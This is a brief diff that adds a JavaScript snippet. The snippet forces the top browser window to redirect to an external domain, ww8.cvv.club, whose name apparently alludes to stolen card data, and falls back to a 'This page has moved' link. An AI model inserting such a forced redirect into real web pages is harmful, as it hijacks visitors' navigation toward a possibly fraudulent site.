@@ -1,0 +1,7 @@
+try
+				{
+				    var rurl = 'http://ww8.cvv.club';
+					window.top.location.replace(rurl);
+				} catch(exception) {
+					document.write("This page has moved, <A HREF='http://ww8.cvv.club'>Click here</A> to go there.");
+				}This page has moved, Click here to go there.
